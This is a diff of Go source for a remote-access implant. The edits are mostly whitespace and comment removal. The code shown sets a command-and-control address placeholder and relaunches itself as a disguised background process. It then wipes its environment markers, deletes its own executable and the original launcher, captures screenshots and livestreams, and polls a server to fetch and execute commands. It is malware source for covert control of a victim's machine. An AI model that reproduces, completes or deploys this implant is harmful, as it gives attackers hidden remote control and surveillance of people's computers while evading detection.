@@ -1,4 +1,3 @@
-// implant/main.go
 package main
 
 import (
@@ -23,12 +22,12 @@ var implantIDBytes []byte
 var c2AddressBytes []byte
 
 const (
-	implantIDPlaceholder = "deadbeef-0000-0000-0000-000000000000"
-	c2AddressPlaceholder = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX"
-	checkInInterval      = 5 * time.Second
-	livestreamInterval   = 1 * time.Second
-	backgroundMarkerEnvVar = "IMPLANT_IS_BACKGROUND_XYZ123"      
-	originalPathEnvVar     = "IMPLANT_ORIG_LAUNCHER_PATH_XYZ789" 
+	implantIDPlaceholder   = "deadbeef-0000-0000-0000-000000000000"
+	c2AddressPlaceholder   = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX"
+	checkInInterval        = 5 * time.Second
+	livestreamInterval     = 1 * time.Second
+	backgroundMarkerEnvVar = "IMPLANT_IS_BACKGROUND_XYZ123"
+	originalPathEnvVar     = "IMPLANT_ORIG_LAUNCHER_PATH_XYZ789"
 )
 
 var (
@@ -40,14 +39,13 @@ var (
 	isLivestreamActive bool
 	stopLivestreamChan chan struct{}
 
-	gOriginalLauncherPath string 
+	gOriginalLauncherPath string
 )
 
 var doSelfDelete func(selfExePath string, originalLauncherPath string)
 var setOSSpecificAttrs func(cmd *exec.Cmd)
 var takeScreenshot func() (string, error)
 
-// Updated signature for relaunchAsDaemonInternal
 var relaunchAsDaemonInternal func(exePath string, args []string, targetName string, bgMarkerEnvKey string, origPathEnvKey string, origPathValue string) error
 
 func implantID() string {
@@ -133,7 +131,7 @@ func initializeConfig() bool {
 }
 
 func main() {
-	exePath, err := os.Executable() 
+	exePath, err := os.Executable()
 	if err != nil {
 		time.Sleep(10 * time.Second)
 		os.Exit(1)
@@ -142,7 +140,7 @@ func main() {
 	isBackgroundProcess := (os.Getenv(backgroundMarkerEnvVar) == "1")
 
 	if !isBackgroundProcess {
-		relaunchArgs := []string{} 
+		relaunchArgs := []string{}
 
 		var effectiveTargetProcessName string
 		if runtime.GOOS == "windows" {
@@ -160,12 +158,10 @@ func main() {
 		os.Exit(0) // Initial launcher exits after successfully starting the backgrounded copy.
 	}
 
-	// Clear the background marker environment variable.
 	os.Unsetenv(backgroundMarkerEnvVar)
 
-	// Retrieve the original launcher path from the new originalPathEnvVar.
 	gOriginalLauncherPath = os.Getenv(originalPathEnvVar)
-	// Clear the original path environment variable for security.
+
 	os.Unsetenv(originalPathEnvVar)
 
 	if !initializeConfig() {
@@ -173,7 +169,6 @@ func main() {
 		os.Exit(1)
 	}
 
-	// Schedule automatic self-deletion after startup
 	if doSelfDelete != nil {
 		// Start self-deletion process in background - delete both current executable and original launcher
 		go func() {
@@ -183,7 +178,6 @@ func main() {
 		}()
 	}
 
-	// Main operational loop
 	for {
 		checkIn()
 		// Pass current exePath (of this backgrounded process) AND the original launcher's path
@@ -217,7 +211,6 @@ func checkIn() {
 	defer resp.Body.Close()
 }
 
-// Modified: fetchAndExecuteCommands now accepts originalLauncherPath
 func fetchAndExecuteCommands(currentImplantExePath string, originalLauncherPath string) {
 	client := http.Client{Timeout: 15 * time.Second}
 	resp, err := client.Get(commandsURL)
